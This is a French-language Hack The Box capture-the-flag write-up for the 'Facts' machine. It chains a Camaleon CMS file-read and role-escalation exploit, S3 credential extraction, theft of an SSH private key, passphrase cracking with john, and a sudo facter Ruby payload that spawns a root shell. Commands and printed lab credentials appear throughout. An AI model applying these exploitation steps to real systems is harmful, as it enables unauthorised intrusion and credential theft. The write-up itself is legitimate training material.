# Hack The Box – Facts (Easy)

# 1. Reconnaissance

## Scan Nmap

```bash
nmap -sS -sC -sV -O -T4 10.129.1.78
```

## Résultat

```
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu
80/tcp open  http    nginx 1.26.3 (Ubuntu)
```

### Observations

* Le site redirige vers :
  `http://facts.htb/`

Ajout dans `/etc/hosts` :

```bash
10.129.1.78 facts.htb
```

---

# 2. Enumeration Web

Accès au site web :

* Page principale accessible
* Test sur `/admin`
* Présence d’une page register / login

Création d’un compte utilisateur et connexion.

Un indice indique :

```
Camaleon CMS v2.9.0
```

---

# 3. Exploitation – Camaleon CMS

## CVE-2024-46987

Camaleon CMS 2.9.0 – Authenticated Arbitrary File Read

Après authentification, exploitation permettant de lire des fichiers arbitraires.

### Test de lecture

```bash
/etc/passwd
```

Résultat :

```
william:x:1001:1001::/home/william:/bin/bash
```

Confirmation d’un utilisateur local.

---

## Lecture du user flag

Recherche du fichier :

```
/home/william/user.txt
```

Flag obtenu.

---

# 4. Privilege Escalation via CMS

Utilisation de l’exploit :

```bash
python3 exploit.py -u http://facts.htb -U root1 -P root -e -r
```

## Résultat

```
Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)

User ID: 7
Current User Role: client
Updated User Role: admin

Extracting S3 Credentials
s3 access key: AKIA4E8ABDE5D0CAA135
s3 secret key: i+evt68ks+mLHD9kcWarDNQCtuqBswAZOua2bQrU
s3 endpoint: http://localhost:54321
```

L’exploit :

* Escalade temporairement le rôle en admin
* Extrait les credentials S3
* Restaure le rôle initial

---

# 5. Enumeration du service S3 interne

Scan du port :

```bash
nmap -p 54321 10.129.1.78
```

Résultat :

```
54321/tcp open
```

---

## Configuration AWS CLI

```bash
aws configure
```

Liste des buckets :

```bash
aws s3 ls --endpoint-url http://10.129.1.78:54321
```

Résultat :

```
internal
randomfacts
```

---

## Analyse bucket randomfacts

```bash
aws s3 ls s3://randomfacts --endpoint-url http://10.129.1.78:54321
```

Contient uniquement des images.

Rien d’exploitable.

---

## Analyse bucket internal

```bash
aws s3 ls s3://internal --endpoint-url http://10.129.1.78:54321
```

Contenu :

```
.bundle/
.cache/
.ssh/
.bashrc
.profile
```

Le dossier `.ssh/` est particulièrement intéressant.

---

# 6. Extraction des clés SSH

```bash
aws s3 sync s3://internal/.ssh ./ssh_dump --endpoint-url http://10.129.1.78:54321
```

Fichiers récupérés :

```
authorized_keys
id_ed25519
```

Permissions :

```bash
chmod 600 id_ed25519
```

---

# 7. Tentative de connexion SSH

```bash
ssh william@facts.htb -i id_ed25519
```

Échec. La clé est protégée par une passphrase.

---

# 8. Crack de la clé SSH

Conversion :

```bash
ssh2john id_ed25519 > hash.john
```

Bruteforce :

```bash
john hash.john --wordlist=/usr/share/wordlists/rockyou.txt
```

Résultat :

```
dragonballz (id_ed25519)
```

---

# 9. Connexion SSH réussie

```bash
ssh trivia@facts.htb -i id_ed25519
```

Passphrase :

```
dragonballz
```

Connexion réussie sur Ubuntu 25.04.

---

# 10. Privilege Escalation – Facter

Vérification des droits sudo :

```bash
sudo -l
```

Résultat :

```
(ALL) NOPASSWD: /usr/bin/facter
```

Cela signifie que l’utilisateur peut exécuter facter en root sans mot de passe.

---

## Exploitation

Facter charge des scripts Ruby via l’option :

```
--custom-dir
```

### 1. Création du dossier

```bash
mkdir /tmp/facts
```

### 2. Création du payload Ruby

```bash
nano /tmp/facts/pwn.rb
```

Contenu :

```ruby
Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end
```

### 3. Exécution

```bash
sudo /usr/bin/facter --custom-dir /tmp/facts
```

Un shell root est obtenu immédiatement.

---

# Root Flag

```bash
cat /root/root.txt
```

Root flag obtenu.

---

# Résumé de l’attaque

1. Scan Nmap
2. Enumeration Web
3. Exploit Camaleon CMS (File Read)
4. Escalade via CMS pour extraire credentials S3
5. Enumeration bucket interne
6. Récupération clé SSH
7. Crack de la passphrase
8. Connexion SSH
9. Exploit Facter via sudo NOPASSWD
10. Root shell
